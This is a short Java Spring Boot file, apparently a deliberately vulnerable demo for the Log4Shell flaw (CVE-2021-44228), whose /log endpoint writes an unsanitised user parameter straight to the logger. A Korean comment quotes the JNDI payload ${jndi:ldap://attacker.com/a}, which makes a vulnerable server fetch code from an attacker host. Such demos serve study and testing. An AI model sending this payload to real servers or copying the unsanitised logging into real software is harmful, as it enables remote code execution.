// CVE-2021-44228-log4shell/src/main/java/com/example/log4shell/Log4ShellApplication.java
package com.example.log4shell;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.*;
import org.springframework.boot.autoconfigure.*;
import org.springframework.web.bind.annotation.*;

@SpringBootApplication
@RestController
public class Log4ShellApplication {
    private static final Logger logger = LoggerFactory.getLogger(Log4ShellApplication.class);

    public static void main(String[] args) {
        SpringApplication.run(Log4ShellApplication.class, args);
    }

    @GetMapping("/log")
    public String log(@RequestParam("msg") String msg) {
        // 바로 로그에 찍기: ${jndi:ldap://attacker.com/a} 같은 페이로드가 JNDI 호출을 시도
        logger.warn("User message: {}", msg);
        return "Logged: " + msg;
    }
}
